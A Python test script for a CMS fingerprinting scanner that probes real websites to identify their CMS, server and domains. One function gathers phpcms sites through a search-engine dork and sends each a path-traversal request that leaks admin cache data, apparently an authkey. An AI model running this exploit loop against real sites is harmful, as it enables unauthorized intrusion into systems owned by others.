# coding=utf-8

from PluginManager import PluginManager
from PluginManager import Model_CMS
from PluginManager import Model_Header
from Crawler import Crawler
import pytesseract
from PIL import Image
from lxml import etree

import requests

# load plugins

PluginManager.LoadAllPlugin()
plugins = Model_CMS.GetPluginObject()
header_plugins = Model_Header.GetPluginObject()

'''
url test, 主要验证下别人的指纹哪些能够访问到，作为自己识别指纹的参考
'''


def url_test():
    target = "http://www.discuz.net/"
    file = open("fingerprint")
    import requests
    for line in file:
        url = target + line
        # print(url.strip())
        res = requests.get(url.strip())
        print("[" + str(res.status_code) + "]" + line.strip())
    file.close()


'''
单个url测试
'''


def single_test(target):
    index_content = ""
    index_header = ""
    try:
        r = requests.get(target)
        index_content = r.content
        index_header = r.headers
        print target + ":"
    except:
        print "[HTTPConnectionError] " + target
        exit(0)

    for head_plugin in header_plugins:
        print "server:", head_plugin.get(index_header)
    for plugin in plugins:
        try:
            detect_res = plugin.detect(target, index_content)
        except:
            print "read error"
            continue
        if detect_res:
            print("cms : " + plugin.name + " / " + plugin.version(target, index_content))


'''
爬虫自动化采集测试
'''


def crawler_multi_test():
    keyword = "inurl:index.php?m=content&c="
    url_list = Crawler.baidu_search(keyword=keyword, page=2)
    for target in url_list:
        for plugin in plugins:
            if plugin.detect(target):
                print(target + " : " + plugin.name)
                if plugin.name == "phpcms":
                    try:
                        s = requests.get(target + "api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key"
                                              "=authkey&cachefile=..%5C..%5C..%5Cphpsso_server%5Ccaches"
                                              "%5Ccaches_admin%5Ccaches_data%5Capplist&path=admin").text
                    except:
                        continue
                    if "aaaaa" in s:
                        print(s)


def testocr():
    image = Image.open("cap.png")
    # image.show() #打开图片1.jpg
    tessdata_dir_config = '--tessdata-dir ./'
    text = pytesseract.image_to_string(image, lang='fra', config=tessdata_dir_config)  # 使用简体中文解析图片
    print(text)

def ip2domain(ip):
    s = requests.get("https://dns.aizhan.com/%s/"%ip)
    dom = etree.HTML(s.content)
    temp = dom.xpath("//td[@class='domain']/a")
    if len(temp) > 0:
        print(ip, ":", temp[0].text)
    else:
        print(ip, ":", "no result")



if __name__ == '__main__':
    # url_test()

    # target = "http://www.wellidc.net" #phpcms
    # target = "http://scs.ucas.ac.cn/"  # joomla
    # target = "http://www.dedecms.com/" # dedecms
    target = "http://www.ecshop119.com/" #ecshop
    # target = "http://bbs.heilanhome.com/" #discuz
    # target = "https://zhidao.baidu.com/"#
    single_test(target)

    #crawler_multi_test()